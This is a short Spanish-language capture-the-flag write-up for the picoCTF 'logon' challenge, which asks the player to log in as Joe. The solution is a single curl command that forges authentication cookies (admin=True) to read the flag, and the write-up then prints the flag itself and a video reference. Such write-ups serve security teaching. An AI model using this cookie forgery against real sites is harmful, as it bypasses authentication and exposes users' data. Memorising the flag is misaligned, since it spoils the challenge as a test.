**Reto:** logon 

**Descripción:**
La fábrica oculta información a todos sus usuarios. ¿Puedes iniciar sesión como Joe y descubrir lo que han estado viendo? `https://jupiter.challenges.picoctf.org/problem/13594/`( [enlace](https://jupiter.challenges.picoctf.org/problem/13594/) ) o http://jupiter.challenges.picoctf.org:13594

**Solución:**
curl "https://jupiter.challenges.picoctf.org/problem/13594/flag" -H "Cookie: username=admin; password=admin; admin=True"
==picoCTF{th3_c0nsp1r4cy_l1v3s_d1c24fef}==
**Notas adicionales:**

**Referencias:** 
https://www.youtube.com/watch?v=P2njyHWhu1U&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=3